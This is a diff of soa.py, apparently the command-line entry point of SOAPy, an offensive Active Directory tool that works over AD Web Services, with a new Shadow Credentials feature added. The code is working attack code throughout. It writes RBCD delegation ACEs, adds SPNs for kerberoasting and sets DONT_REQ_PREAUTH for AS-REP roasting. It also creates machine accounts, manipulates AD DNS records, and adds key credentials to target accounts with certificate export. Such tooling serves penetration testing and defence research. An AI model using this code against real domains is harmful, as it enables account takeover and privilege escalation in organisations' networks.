@@ -1,4 +1,22 @@
 #!/usr/bin/env python3
+"""
+soa.py
+
+Main CLI entrypoint for SOAPy ADWS operations, extended to support:
+  - AD-integrated DNS management (add/modify/remove/tombstone/resurrect)
+  - Computer management (create/delete/disable)
+  - Shadow Credentials (msDS-KeyCredentialLink) management
+  - RBCD, SPN, ASREP attacks
+
+Shadow Credentials options:
+  --shadow-creds ACTION   Shadow Credentials action (list/add/remove/clear/info)
+  --shadow-target TARGET  Target account for Shadow Credentials
+  --device-id ID          Device ID for remove/info actions
+  --cert-filename NAME    Filename for certificate export
+  --cert-export TYPE      Export type: PEM or PFX (default: PFX)
+  --cert-password PASS    Password for PFX file
+  --shadow-creds-help     Display detailed Shadow Credentials help
+"""
 
 import argparse
 import logging
@@ -33,14 +51,34 @@ from src.ad_dns_manager_adws import (
     resurrect_dns_record_adws,
 )
 
-# https://github.com/fortra/impacket/blob/829239e334fee62ace0988a0cb5284233d8ec3c4/examples/rbcd.py#L180
+# Shadow Credentials helpers
+try:
+    from src.shadow_credentials import (
+        ShadowCredentialsADWS,
+        shadow_credentials_list,
+        shadow_credentials_add,
+        shadow_credentials_remove,
+        shadow_credentials_clear,
+        shadow_credentials_info,
+        print_shadow_creds_help,
+        DSINTERNALS_AVAILABLE,
+    )
+    SHADOW_CREDS_AVAILABLE = DSINTERNALS_AVAILABLE
+except ImportError:
+    SHADOW_CREDS_AVAILABLE = False
+    def print_shadow_creds_help():
+        print("Shadow Credentials module not available. Install dsinternals: pip install dsinternals")
+
+# ---------------------------------------------------------------------------
+# Utility helpers
+# ---------------------------------------------------------------------------
+
 def _create_empty_sd():
     sd = SR_SECURITY_DESCRIPTOR()
     sd["Revision"] = b"\x01"
     sd["Sbz1"] = b"\x00"
     sd["Control"] = 32772
     sd["OwnerSid"] = LDAP_SID()
-    # BUILTIN\Administrators
     sd["OwnerSid"].fromCanonical("S-1-5-32-544")
     sd["GroupSid"] = b""
     sd["Sacl"] = b""
@@ -53,14 +91,13 @@ def _create_empty_sd():
     return sd
 
 
-# https://github.com/fortra/impacket/blob/829239e334fee62ace0988a0cb5284233d8ec3c4/examples/rbcd.py#L200
 def _create_allow_ace(sid: LDAP_SID):
     nace = ACE()
     nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
     nace["AceFlags"] = 0x00
     acedata = ACCESS_ALLOWED_ACE()
     acedata["Mask"] = ACCESS_MASK()
-    acedata["Mask"]["Mask"] = 983551  # Full control
+    acedata["Mask"]["Mask"] = 983551
     acedata["Sid"] = sid.getData()
     nace["Ace"] = acedata
     return nace
@@ -77,7 +114,6 @@ def getAccountDN(target: str, username: str, ip: str, domain: str, auth: NTLMAut
 
     distinguishedName_elem = None
 
-    # Look for user first, then computer (same order used in other scripts)
     for tag in [".//addata:user", ".//addata:computer"]:
         for item in pull_et.findall(tag, namespaces=NAMESPACES):
             distinguishedName_elem = item.find(
@@ -95,9 +131,7 @@ def getAccountDN(target: str, username: str, ip: str, domain: str, auth: NTLMAut
 
 
 from xml.etree import ElementTree as ET
-from uuid import uuid4
 from src.adws import ADWSConnect, ADWSError
-from src.soap_templates import LDAP_DELETE_FOR_RESOURCE
 
 def delete_computer(
     machine_name: str,
@@ -106,27 +140,14 @@ def delete_computer(
     domain: str,
     auth: NTLMAuth
 ) -> bool:
-    """
-    Delete an AD computer object using ADWS WS-Transfer Delete.
-
-    Improved error handling: catches ADWS faults and prints a concise English
-    message for common cases (insufficient rights, validation errors, ...).
-    """
+    """Delete an AD computer object using ADWS WS-Transfer Delete."""
     print(f"[*] Attempting to delete computer: {machine_name}")
 
-    # Normalize SAM
     sam = machine_name if machine_name.endswith("$") else machine_name + "$"
 
-    # ---- Locate DN of the computer ----
     print("[*] Locating computer in AD...")
     try:
-        dn = getAccountDN(
-            target=sam,
-            username=username,
-            ip=ip,
-            domain=domain,
-            auth=auth
-        )
+        dn = getAccountDN(target=sam, username=username, ip=ip, domain=domain, auth=auth)
     except Exception as e:
         print(f"[-] Failed to locate machine {sam}: {e}")
         return False
@@ -137,16 +158,9 @@ def delete_computer(
 
     print(f"[+] Found DN: {dn}")
 
-    # ---- Build WS-Transfer Delete request ----
     msg_id = f"urn:uuid:{uuid4()}"
+    delete_payload = LDAP_DELETE_FOR_RESOURCE.format(object_dn=dn, fqdn=ip, uuid=msg_id)
 
-    delete_payload = LDAP_DELETE_FOR_RESOURCE.format(
-        object_dn=dn,
-        fqdn=ip,
-        uuid=msg_id
-    )
-
-    # ---- Send request ----
     print("[*] Connecting to ADWS Resource endpoint to delete object...")
 
     client = ADWSConnect(ip, domain, username, auth, "Resource")
@@ -157,11 +171,9 @@ def delete_computer(
         print(f"[-] Transport error when sending Delete request: {e}")
         return False
 
-    # Try to parse the response safely and produce a concise English message on failure
     try:
         et = client._handle_str_to_xml(response)
     except ADWSError:
-        # Extract useful info from raw SOAP Fault and show a short message
         s = response if isinstance(response, str) else response.decode(errors="ignore")
         start = s.find('<')
         if start != -1:
@@ -169,72 +181,30 @@ def delete_computer(
         try:
             root = ET.fromstring(s)
             ns = {'ad': 'http://schemas.microsoft.com/2008/1/ActiveDirectory'}
-            win32_elem = root.find('.//ad:Win32ErrorCode', namespaces=ns)
-            errcode_elem = root.find('.//ad:ErrorCode', namespaces=ns)
             msg_elem = root.find('.//ad:Message', namespaces=ns)
-            ext_elem = root.find('.//ad:ExtendedErrorMessage', namespaces=ns)
-
-            win32 = win32_elem.text.strip() if win32_elem is not None and win32_elem.text else None
-            errcode = errcode_elem.text.strip() if errcode_elem is not None and errcode_elem.text else None
             msg = msg_elem.text.strip() if msg_elem is not None and msg_elem.text else None
-            ext = ext_elem.text.strip() if ext_elem is not None and ext_elem.text else None
-
-            # Map to short, user-friendly messages
-            if win32 == '5' or errcode == '50' or (msg and 'insufficient access' in msg.lower()):
-                print("! Insufficient access rights to perform the operation.")
-            elif msg:
-                short = msg.splitlines()[0]
-                print(f"! AD error: {short}")
-                if ext:
-                    print(f"  Details: {ext}")
+            if msg:
+                print(f"! AD error: {msg.splitlines()[0]}")
             else:
-                print("! ADWS operation failed (see server response for details).")
+                print("! ADWS operation failed.")
         except Exception:
-            # If parsing fails, fallback to a single-line message
-            print("! ADWS operation failed and the fault could not be parsed.")
+            print("! ADWS operation failed.")
         return False
 
-    # If parsing succeeded but returned no XML object
     if et is None:
-        print("[-] Empty or malformed DeleteResponse (AD may still have removed the object).")
+        print("[-] Empty or malformed DeleteResponse.")
         return False
 
-    # Check for explicit SOAP Fault even when _handle_str_to_xml did not raise
     fault = et.find(".//{http://www.w3.org/2003/05/soap-envelope}Fault")
     if fault is not None:
-        # try the same concise extraction as above
-        try:
-            ns = {'ad': 'http://schemas.microsoft.com/2008/1/ActiveDirectory'}
-            win32_elem = et.find('.//ad:Win32ErrorCode', namespaces=ns)
-            errcode_elem = et.find('.//ad:ErrorCode', namespaces=ns)
-            msg_elem = et.find('.//ad:Message', namespaces=ns)
-            ext_elem = et.find('.//ad:ExtendedErrorMessage', namespaces=ns)
-
-            win32 = win32_elem.text.strip() if win32_elem is not None and win32_elem.text else None
-            errcode = errcode_elem.text.strip() if errcode_elem is not None and errcode_elem.text else None
-            msg = msg_elem.text.strip() if msg_elem is not None and msg_elem.text else None
-            ext = ext_elem.text.strip() if ext_elem is not None and ext_elem.text else None
-
-            if win32 == '5' or errcode == '50' or (msg and 'insufficient access' in msg.lower()):
-                print("! Insufficient access rights to perform the operation.")
-            elif msg:
-                short = msg.splitlines()[0]
-                print(f"! AD error: {short}")
-                if ext:
-                    print(f"  Details: {ext}")
-            else:
-                print("! ADWS operation failed (server returned a SOAP Fault).")
-        except Exception:
-            print("! ADWS operation failed (SOAP Fault present).")
+        print("! ADWS operation failed (SOAP Fault present).")
         return False
 
-    # Success
     print(f"[+] Computer {sam} successfully deleted.")
     return True
 
 
 def encode_unicode_pwd(password: str) -> str:
-    # AD requires: password in quotes, UTF-16LE encoded, base64 encoded
     quoted = f'"{password}"'
     pwd_utf16 = quoted.encode('utf-16-le')
     return base64.b64encode(pwd_utf16).decode()
@@ -252,27 +222,21 @@ def add_computer(
     computer_pass: str = None,
     spn_list: list = None,
 ) -> bool:
-    """
-    Create a computer object in AD via ADWS ResourceFactory (WS-Transfer Create)
-    and optionally set unicodePwd and SPNs via Put operations.
-    """
+    """Create a computer object in AD via ADWS ResourceFactory."""
     if remove:
         raise NotImplementedError("Removal logic is not implemented.")
     
-    # If no machine_name given by user, generate a secure name
     import secrets
 
     if machine_name is None:
         machine_name = 'DESKTOP-' + (''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8)))
 
-    print(f"[+] Using machine ame: {machine_name}")
+    print(f"[+] Using machine name: {machine_name}")
 
-    # Normalize names
     sam = machine_name if machine_name.endswith("$") else machine_name + "$"
     cn = machine_name
     host = cn.rstrip("$")
 
-    # Find DN container
     if ou_dn:
         container_dn = ou_dn
     else:
@@ -280,10 +244,8 @@ def add_computer(
         domain_dn = ",".join(domain_parts)
         container_dn = f"CN=Computers,{domain_dn}"
 
-    logging.info(f"Creating computer account {sam} in {container_dn} via ADWS ResourceFactory")
+    logging.info(f"[+] Creating computer account {sam} in {container_dn} via ADWS ResourceFactory")
 
-    # ---- Build AttributeTypeAndValue XML blocks ----
-    # If no password given by user, generate a secure 16-character password
     import secrets
 
     if computer_pass is None:
@@ -294,7 +256,6 @@ def add_computer(
 
     encoded_pass = encode_unicode_pwd(computer_pass)
 
-    # Default SPNs like Powermad / Impacket
     default_spns = [
         f"HOST/{host}",
         f"HOST/{host}.{domain}",
@@ -309,7 +270,7 @@ def add_computer(
         "ad:container-hierarchy-parent": [container_dn],
         "ad:relativeDistinguishedName": [f"CN={cn}"],
         "addata:sAMAccountName": [sam],
-        "addata:userAccountControl": ["4096"],  # WORKSTATION_TRUST_ACCOUNT (0x1000)
+        "addata:userAccountControl": ["4096"],
         "addata:dnsHostName": [f"{host}.{domain}"],
         "addata:servicePrincipalName": spns,
         "addata:unicodePwd": [encoded_pass],
@@ -320,10 +281,8 @@ def add_computer(
         values_xml = ""
         for v in values:
             if attr_type == "addata:unicodePwd":
-                # unicodePwd must be sent as base64Binary in ADWS SOAP
                 values_xml += f'<ad:value xsi:type="xsd:base64Binary">{v}</ad:value>'
             else:
-                # SPNs and dnsHostName are strings; multiple SPNs create multiple <ad:value> entries
                 values_xml += f'<ad:value xsi:type="xsd:string">{v}</ad:value>'
 
         atav_xml += (
@@ -333,7 +292,6 @@ def add_computer(
             "      </AttributeTypeAndValue>\n"
         )
 
-    # ---- Build SOAP Envelope ----
     msg_id = f"urn:uuid:{uuid4()}"
 
     addrequest_payload = LDAP_CREATE_FOR_RESOURCEFACTORY.format(
@@ -342,7 +300,6 @@ def add_computer(
         atav_xml=atav_xml
     )
 
-    # ---- Send AddRequest ----
     client = ADWSConnect(ip, domain, username, auth, "ResourceFactory")
     client._nmf.send(addrequest_payload)
     response = client._nmf.recv()
@@ -351,13 +308,13 @@ def add_computer(
     if et is None:
         raise RuntimeError("AddRequest response empty or malformed.")
 
-    logging.info("AddRequest successful. Locating newly created object...")
+    logging.info("[+] AddRequest successful. Locating newly created object...")
 
     dn = getAccountDN(target=sam, username=username, ip=ip, domain=domain, auth=auth)
     if not dn:
         raise RuntimeError("Failed to locate DN of the newly created computer.")
 
-    logging.info(f"Created object DN: {dn}")
+    logging.info(f"[+] Created object DN: {dn}")
 
     print(f"[+] Computer {sam} successfully created in {dn}")
     return True
@@ -372,7 +329,7 @@ def set_spn(
     auth: NTLMAuth,
     remove: bool = False,
 ):
-    """Set a value in servicePrincipalName. Appends value to the attribute rather than replacing."""
+    """Set a value in servicePrincipalName."""
     dn = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)
                                   
     put_client = ADWSConnect.put_client(ip, domain, username, auth)
@@ -396,14 +353,11 @@ def set_asrep(
     auth: NTLMAuth,
     remove: bool = False,
 ):
-    """Set or clear the DONT_REQ_PREAUTH flag on userAccountControl via ADWS Put (replace)."""
+    """Set or clear the DONT_REQ_PREAUTH flag on userAccountControl."""
     get_accounts_queries = f"(sAMAccountName={target})"
     pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
 
-    attributes: list = [
-        "userAccountControl",
-        "distinguishedName",
-    ]
+    attributes: list = ["userAccountControl", "distinguishedName"]
 
     pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
     uac = None
@@ -420,22 +374,16 @@ def set_asrep(
     put_client = ADWSConnect.put_client(ip, domain, username, auth)
     if not remove:
         newUac = int(uac.text) | 0x400000
-        put_client.put(
-            object_ref=dn,
-            operation="replace",
-            attribute="addata:userAccountControl",
-            data_type="string",
-            value=newUac,
-        )
     else:
         newUac = int(uac.text) & ~0x400000
-        put_client.put(
-            object_ref=dn,
-            operation="replace",
-            attribute="addata:userAccountControl",
-            data_type="string",
-            value=newUac,
-        )
+    
+    put_client.put(
+        object_ref=dn,
+        operation="replace",
+        attribute="addata:userAccountControl",
+        data_type="string",
+        value=newUac,
+    )
     
     print(f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!")
 
@@ -449,7 +397,7 @@ def set_rbcd(
     auth: NTLMAuth,
     remove: bool = False,
 ):
-    """Write or remove RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) using ADWS Put operations."""
+    """Write or remove RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)."""
     get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"
     pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
 
@@ -488,7 +436,6 @@ def set_rbcd(
         logging.critical(f"Unable to find {target} or {account}.")
         raise SystemExit()
 
-    # collect a clean list.  remove the account sid if its present
     target_sd["Dacl"].aces = [
         ace
         for ace in target_sd["Dacl"].aces
@@ -526,23 +473,15 @@ def disable_machine_account(
     domain: str,
     auth: NTLMAuth
 ) -> bool:
-    """
-    Disable a computer account (set the ACCOUNTDISABLE flag in userAccountControl)
-    using ADWS WS-Transfer Put (replace userAccountControl).
-    """
+    """Disable a computer account."""
     print(f"[*] Attempting to disable computer: {machine_name}")
 
-    # Normalize SAM
     sam = machine_name if machine_name.endswith("$") else machine_name + "$"
 
-    # ---- Locate current userAccountControl and DN ----
     get_accounts_queries = f"(sAMAccountName={sam})"
     pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
 
-    attributes: list = [
-        "userAccountControl",
-        "distinguishedName",
-    ]
+    attributes: list = ["userAccountControl", "distinguishedName"]
 
     try:
         pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
@@ -553,7 +492,6 @@ def disable_machine_account(
     uac_elem = None
     distinguishedName_elem = None
 
-    # Try computer first, then user
     for tag in [".//addata:computer", ".//addata:user"]:
         for item in pull_et.findall(tag, namespaces=NAMESPACES):
             if uac_elem is None:
@@ -584,12 +522,11 @@ def disable_machine_account(
     ACCOUNTDISABLE_FLAG = 0x2
 
     if (current_uac & ACCOUNTDISABLE_FLAG) != 0:
-        print(f"[-] Computer {sam} is already disabled (userAccountControl={current_uac}).")
+        print(f"[-] Computer {sam} is already disabled.")
         return True
 
     new_uac = current_uac | ACCOUNTDISABLE_FLAG
 
-    # ---- Perform Put (replace userAccountControl) ----
     try:
         put_client = ADWSConnect.put_client(ip, domain, username, auth)
         put_client.put(
@@ -603,7 +540,7 @@ def disable_machine_account(
         print(f"[-] Failed to write new userAccountControl for {sam}: {e}")
         return False
 
-    print(f"[+] Computer {sam} successfully disabled (userAccountControl set to {new_uac}).")
+    print(f"[+] Computer {sam} successfully disabled.")
     return True
 
 
@@ -631,25 +568,15 @@ github.com/jlevere
     parser.add_argument(
         "connection",
         action="store",
+        nargs="?",
+        default=None,
         help="domain/username[:password]@<targetName or address>",
     )
-    parser.add_argument(
-        "--debug",
-        action="store_true",
-        help="Turn DEBUG output ON"
-    )
-    parser.add_argument(
-        "--ts",
-        action="store_true",
-        help="Adds timestamp to every logging output."
-    )
-    parser.add_argument(
-        "-H", "--hash",
-        action="store",
-        metavar="nthash",
-        help="Use an NT hash for authentication",
-    )
+    parser.add_argument("--debug", action="store_true", help="Turn DEBUG output ON")
+    parser.add_argument("--ts", action="store_true", help="Adds timestamp to every logging output.")
+    parser.add_argument("-H", "--hash", action="store", metavar="nthash", help="Use an NT hash for authentication")
 
+    # Enumeration options
     enum = parser.add_argument_group('Enumeration')
     enum.add_argument("--users", action="store_true", help="Enumerate user objects")
     enum.add_argument("--computers", action="store_true", help="Enumerate computer objects")
@@ -665,6 +592,7 @@ github.com/jlevere
     enum.add_argument("-dn", "--distinguishedname", action="store", metavar="distinguishedname", help="The root object's distinguishedName for the query")
     enum.add_argument("-p", "--parse", action="store_true", help="Parse attributes to human readable format")
 
+    # Writing options
     writing = parser.add_argument_group('Writing')
     writing.add_argument("--rbcd", action="store", metavar="source", help="Write/remove RBCD (source computer)")
     writing.add_argument("--spn", action="store", metavar="value", help='Write servicePrincipalName value (use --remove to delete)')
@@ -672,30 +600,59 @@ github.com/jlevere
     writing.add_argument("--account", action="store", metavar="account", help="Account to perform operations on")
     writing.add_argument("--remove", action="store_true", help="Remove attribute value based on operation")
 
-    # Computer management (create/delete/disable)
-    writing.add_argument("--addcomputer", nargs='?', const='', action="store", metavar="MACHINE", help="Create a computer account in AD (optional MACHINE name)")
-    writing.add_argument("--computer-pass", action="store", metavar="pass", help="Password for the new computer account (optional).")
-    writing.add_argument("--ou", action="store", metavar="ou", help="DN of the OU where to create the computer (optional).")
+    # Computer management
+    writing.add_argument("--addcomputer", nargs='?', const='', action="store", metavar="MACHINE", help="Create a computer account in AD")
+    writing.add_argument("--computer-pass", action="store", metavar="pass", help="Password for the new computer account")
+    writing.add_argument("--ou", action="store", metavar="ou", help="DN of the OU where to create the computer")
     writing.add_argument("--delete-computer", action="store", metavar="MACHINE", help="Delete an existing computer account")
-    writing.add_argument("--disable-account", action="store", metavar="MACHINE", help="Disable a computer account (set AccountDisabled)")
+    writing.add_argument("--disable-account", action="store", metavar="MACHINE", help="Disable a computer account")
+
+    # Shadow Credentials options
+    shadow = parser.add_argument_group('Shadow Credentials (msDS-KeyCredentialLink)')
+    shadow.add_argument("--shadow-creds", action="store", metavar="ACTION",
+                       choices=['list', 'add', 'remove', 'clear', 'info'],
+                       help="Shadow Credentials action: list, add, remove, clear, info")
+    shadow.add_argument("--shadow-target", action="store", metavar="TARGET",
+                       help="Target account for Shadow Credentials operation")
+    shadow.add_argument("--device-id", action="store", metavar="ID",
+                       help="Device ID for remove/info actions")
+    shadow.add_argument("--cert-filename", action="store", metavar="NAME",
+                       help="Filename for certificate export (add action)")
+    shadow.add_argument("--cert-export", action="store", metavar="TYPE",
+                       choices=['PEM', 'PFX'], default='PFX',
+                       help="Export type: PEM or PFX (default: PFX)")
+    shadow.add_argument("--cert-password", action="store", metavar="PASS",
+                       help="Password for PFX file (random if not set)")
+    shadow.add_argument("--shadow-creds-help", action="store_true",
+                       help="Display detailed Shadow Credentials help and examples")
 
     # DNS management options
     writing.add_argument("--dns-add", action="store", metavar="FQDN", help="Add A record (FQDN). Requires --dns-ip")
     writing.add_argument("--dns-modify", action="store", metavar="FQDN", help="Modify/replace A record (FQDN). Requires --dns-ip")
     writing.add_argument("--dns-remove", action="store", metavar="FQDN", help="Remove A record (FQDN). Requires --dns-ip unless --ldapdelete")
-    writing.add_argument("--dns-tombstone", action="store", metavar="FQDN", help="Tombstone a dnsNode (replace with TS record + set dNSTombstoned=true)")
+    writing.add_argument("--dns-tombstone", action="store", metavar="FQDN", help="Tombstone a dnsNode")
     writing.add_argument("--dns-resurrect", action="store", metavar="FQDN", help="Resurrect a tombstoned dnsNode")
     writing.add_argument("--dns-ip", action="store", metavar="IP", help="IP used with dns add/modify/remove")
-    writing.add_argument("--ldapdelete", action="store_true", help="Use delete on dnsNode object (when used with --dns-remove)")
+    writing.add_argument("--ldapdelete", action="store_true", help="Use delete on dnsNode object")
     writing.add_argument("--allow-multiple", action="store_true", help="Allow multiple A records when adding")
     writing.add_argument("--ttl", type=int, default=180, help="TTL for new A record (default 180)")
     writing.add_argument("--tcp", action="store_true", help="Use DNS over TCP when fetching SOA serial")
+
+    # Handle --shadow-creds-help before full argument parsing
+    if "--shadow-creds-help" in sys.argv:
+        print_shadow_creds_help()
+        sys.exit(0)
 
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
 
     options = parser.parse_args()
+
+    # Check if connection is required
+    if options.connection is None:
+        parser.print_help()
+        sys.exit(1)
 
     logger.init(options.ts)
     if options.debug is True:
@@ -708,7 +665,6 @@ github.com/jlevere
     if domain is None:
         domain = ""
 
-    # Ask for password if missing and username present
     if password == "" and username != "" and options.hash is None:
         from getpass import getpass
         password = getpass("Password:")
@@ -741,13 +697,78 @@ github.com/jlevere
 
     auth = NTLMAuth(password=password, hashes=options.hash)
 
-    # -----------------------
-    # Writing operations
-    # -----------------------
-
     try:
+        # -----------------------
+        # Shadow Credentials operations
+        # -----------------------
+        if options.shadow_creds:
+            if not SHADOW_CREDS_AVAILABLE:
+                logging.critical("Shadow Credentials module not available. Install dsinternals: pip install dsinternals")
+                logging.critical("Use --shadow-creds-help for more information")
+                raise SystemExit(1)
+            
+            if not options.shadow_target:
+                logging.critical("--shadow-target is required for Shadow Credentials operations")
+                raise SystemExit(1)
+            
+            if options.shadow_creds == 'list':
+                shadow_credentials_list(
+                    target=options.shadow_target,
+                    username=username,
+                    ip=remoteName,
+                    domain=domain,
+                    auth=auth,
+                )
+            
+            elif options.shadow_creds == 'add':
+                shadow_credentials_add(
+                    target=options.shadow_target,
+                    username=username,
+                    ip=remoteName,
+                    domain=domain,
+                    auth=auth,
+                    filename=options.cert_filename,
+                    export_type=options.cert_export,
+                    pfx_password=options.cert_password,
+                )
+            
+            elif options.shadow_creds == 'remove':
+                if not options.device_id:
+                    logging.critical("--device-id is required for remove action")
+                    raise SystemExit(1)
+                shadow_credentials_remove(
+                    target=options.shadow_target,
+                    device_id=options.device_id,
+                    username=username,
+                    ip=remoteName,
+                    domain=domain,
+                    auth=auth,
+                )
+            
+            elif options.shadow_creds == 'clear':
+                shadow_credentials_clear(
+                    target=options.shadow_target,
+                    username=username,
+                    ip=remoteName,
+                    domain=domain,
+                    auth=auth,
+                )
+            
+            elif options.shadow_creds == 'info':
+                if not options.device_id:
+                    logging.critical("--device-id is required for info action")
+                    raise SystemExit(1)
+                shadow_credentials_info(
+                    target=options.shadow_target,
+                    device_id=options.device_id,
+                    username=username,
+                    ip=remoteName,
+                    domain=domain,
+                    auth=auth,
+                )
+
         # RBCD
-        if options.rbcd is not None:
+        elif options.rbcd is not None:
             if not options.account:
                 logging.critical('"--rbcd" must be used with "--account"')
                 raise SystemExit()
@@ -792,51 +813,28 @@ github.com/jlevere
 
         # Add computer
         elif getattr(options, "addcomputer", None) is not None:
-            if not username:
-                logging.critical('Please specify a username with the connection string')
-                raise SystemExit()
-
             machine_name = None if options.addcomputer == "" else options.addcomputer
-            try:
-                add_computer(
-                    target=options.account if options.account else None,
-                    machine_name=machine_name,
-                    ou_dn=options.ou,
-                    username=username,
-                    ip=remoteName,
-                    domain=domain,
-                    auth=auth,
-                    remove=options.remove,
-                    computer_pass=options.computer_pass,
-                )
-                display_name = machine_name if machine_name else "(generated)"
-                print(f"[+] Computer {display_name} {'removed' if options.remove else 'created'} successfully.")
-            except NotImplementedError as e:
-                logging.error("Feature not implemented: %s", e)
-                raise SystemExit(2)
-            except Exception as e:
-                logging.exception("Error during add_computer operation: %s", e)
-                raise SystemExit(1)
+            add_computer(
+                target=options.account if options.account else None,
+                machine_name=machine_name,
+                ou_dn=options.ou,
+                username=username,
+                ip=remoteName,
+                domain=domain,
+                auth=auth,
+                remove=options.remove,
+                computer_pass=options.computer_pass,
+            )
 
         # Disable account
         elif options.disable_account:
-            if not username:
-                logging.critical('Please specify a username with the connection string')
-                raise SystemExit()
-            try:
-                success = disable_machine_account(
-                    machine_name=options.disable_account,
-                    username=username,
-                    ip=remoteName,
-                    domain=domain,
-                    auth=auth,
-                )
-                if not success:
-                    raise SystemExit(1)
-                print(f"[+] Computer {options.disable_account} disabled successfully (requested).")
-            except Exception as e:
-                logging.exception("Error during disable_account operation: %s", e)
-                raise SystemExit(1)
+            disable_machine_account(
+                machine_name=options.disable_account,
+                username=username,
+                ip=remoteName,
+                domain=domain,
+                auth=auth,
+            )
 
         # Delete computer
         elif options.delete_computer:
@@ -847,11 +845,8 @@ github.com/jlevere
                 domain=domain,
                 auth=auth,
             )
-            return
 
-        # -----------------------
         # DNS operations
-        # -----------------------
         elif options.dns_add:
             if not options.dns_ip:
                 logging.critical("--dns-add requires --dns-ip")
@@ -918,12 +913,10 @@ github.com/jlevere
                 tcp=options.tcp,
             )
 
-        # -----------------------
         # Enumeration / Pull operations (default)
-        # -----------------------
         else:
-            if ldap_query is None or all(q is None for q in ldap_query):
-                logging.critical("Query cannot be None")
+            if not ldap_query or all(q is None for q in ldap_query):
+                logging.critical("No operation specified. Use --help for available options.")
                 raise SystemExit()
 
             client = ADWSConnect.pull_client(
